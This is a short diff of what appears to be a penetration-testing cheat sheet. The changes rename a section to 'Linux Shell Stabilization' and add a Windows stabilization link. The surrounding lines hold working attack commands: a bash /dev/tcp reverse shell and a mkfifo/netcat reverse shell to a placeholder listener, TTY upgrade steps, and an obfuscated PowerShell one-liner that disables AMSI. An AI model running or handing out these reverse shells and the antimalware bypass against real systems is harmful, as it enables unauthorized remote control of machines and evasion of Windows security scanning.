@@ -79,7 +79,7 @@ bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f
 
-# Shell Stabilization
+# Linux Shell Stabilization
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
 (inside the nc session) CTRL+Z;
 stty raw -echo; fg; 
@@ -88,6 +88,9 @@ export SHELL=/bin/bash;
 export TERM=screen; 
 stty rows 38 columns 116; 
 reset;
+
+# Windows Shell Stabilization
+https://github.com/antonioCoco/ConPtyShell
 
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
